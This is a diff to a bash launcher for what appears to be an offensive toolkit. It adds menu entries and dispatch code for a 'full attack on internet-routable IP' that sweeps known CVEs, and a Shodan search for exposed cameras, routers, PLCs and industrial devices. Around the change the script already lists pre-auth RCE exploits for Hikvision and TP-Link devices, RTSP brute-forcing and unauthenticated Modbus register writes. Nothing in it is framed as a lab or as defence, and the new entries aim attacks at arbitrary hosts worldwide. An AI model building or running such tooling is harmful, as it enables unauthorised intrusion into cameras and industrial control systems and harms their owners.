@@ -4340,7 +4340,7 @@ cmd_help() {
     echo -e "                          Compromises all LAN hosts with zero victim interaction"
     echo ""
     echo -e "  ${Y}━━━ IOT ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
-    echo -e "  ${C}bash start iot${N}           Interactive IoT attack menu (20 options)"
+    echo -e "  ${C}bash start iot${N}           Interactive IoT attack menu (22 options)"
     echo -e "  ${C}bash start iot auto${N}      Full auto: scan subnet, attack all IoT devices"
     echo -e "  ${C}bash start iot scan${N}      Discover IoT devices (cameras, routers, PLCs...)"
     echo -e "  ${C}bash start iot rtsp <ip>${N} RTSP camera brute-force + snapshot capture"
@@ -4350,6 +4350,8 @@ cmd_help() {
     echo -e "  ${C}bash start iot modbus <ip>${N} Modbus PLC: read/write registers (no auth)"
     echo -e "  ${C}bash start iot hikvision <ip>${N} CVE-2021-36260 pre-auth RCE"
     echo -e "  ${C}bash start iot tplink <ip>${N}   CVE-2023-1389 unauthenticated RCE"
+    echo -e "  ${C}bash start iot external <ip> [apikey]${N}  Full attack on internet-routable IP"
+    echo -e "  ${C}bash start iot shodan <apikey> [query] [country] [limit]${N}  Shodan IoT search"
     echo ""
     echo -e "  ${Y}━━━ WIFI ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash start wifi${N}          Interactive WiFi attack menu"
@@ -8184,7 +8186,11 @@ cmd_iot() {
             echo -e "  ${W}[19]${N} CVE-2021-33544  Geutebruck camera RCE"
             echo -e "  ${W}[20]${N} Dahua auth bypass + snapshot grab"
             echo ""
-            read -rp "  Select [1-20]: " sel
+            echo -e "  ${Y}External (Internet) Targets:${N}"
+            echo -e "  ${W}[21]${N} External single-host attack  (internet-routable IP, full CVE sweep)"
+            echo -e "  ${W}[22]${N} Shodan search               (find exposed devices globally)"
+            echo ""
+            read -rp "  Select [1-22]: " sel
             case "$sel" in
                 1)  read -rp "  Subnet [192.168.1.0/24]: " SN; SN="${SN:-192.168.1.0/24}"
                     if ! python3 -c "import ipaddress; ipaddress.ip_network('$SN',strict=False)" 2>/dev/null; then
@@ -8253,6 +8259,16 @@ cve_geutebruck_rce('$IP')
 " ;;
                 20) read -rp "  Dahua DVR/NVR IP: " IP
                     python3 "$MOD" --action dahua_bypass --ip "$IP" ;;
+                21) read -rp "  Target IP: " IP
+                    read -rp "  Shodan API key (optional, Enter to skip): " SKEY
+                    echo -e "${Y}[*] External IoT attack: $IP${N}"
+                    python3 "$MOD" external --ip "$IP" --out "$HOME/.wizza/logs" ${SKEY:+--apikey "$SKEY"} ;;
+                22) read -rp "  Shodan API key: " SKEY
+                    echo -e "  Presets: cameras rtsp mqtt modbus telnet_iot upnp hikvision dahua tplink routers industrial"
+                    read -rp "  Query or preset [cameras]: " QRY; QRY="${QRY:-cameras}"
+                    read -rp "  Country filter (e.g. DE, US — Enter for all): " CC
+                    read -rp "  Result limit [100]: " LIM; LIM="${LIM:-100}"
+                    python3 "$MOD" shodan --apikey "$SKEY" --query "$QRY" --limit "$LIM" ${CC:+--country "$CC"} ;;
             esac
             ;;
 
@@ -8306,8 +8322,22 @@ cve_geutebruck_rce('$IP')
         lifx)
             python3 "$MOD" lifx
             ;;
+        external)
+            [[ -z "$TARGET" ]] && { err "Usage: start iot external <ip> [shodan_apikey]"; return; }
+            SKEY="${EXTRA1:-}"
+            echo -e "${Y}[*] External IoT attack: $TARGET${N}"
+            python3 "$MOD" external --ip "$TARGET" --out "$HOME/.wizza/logs" ${SKEY:+--apikey "$SKEY"}
+            ;;
+        shodan)
+            [[ -z "$TARGET" ]] && { err "Usage: start iot shodan <apikey> [query] [country] [limit]"; return; }
+            QRY="${EXTRA1:-cameras}"
+            CC="${EXTRA2:-}"
+            LIM="${5:-100}"
+            echo -e "${Y}[*] Shodan: $QRY${N}"
+            python3 "$MOD" shodan --apikey "$TARGET" --query "$QRY" --limit "$LIM" ${CC:+--country "$CC"}
+            ;;
         *)
-            echo "Usage: start iot [auto|scan|rtsp|mqtt|hue|ros|hikvision|tplink|modbus|ssdp|mdns|lifx] [target]"
+            echo "Usage: start iot [auto|scan|rtsp|mqtt|hue|ros|hikvision|tplink|modbus|ssdp|mdns|lifx|external|shodan] [target]"
             ;;
     esac
 }
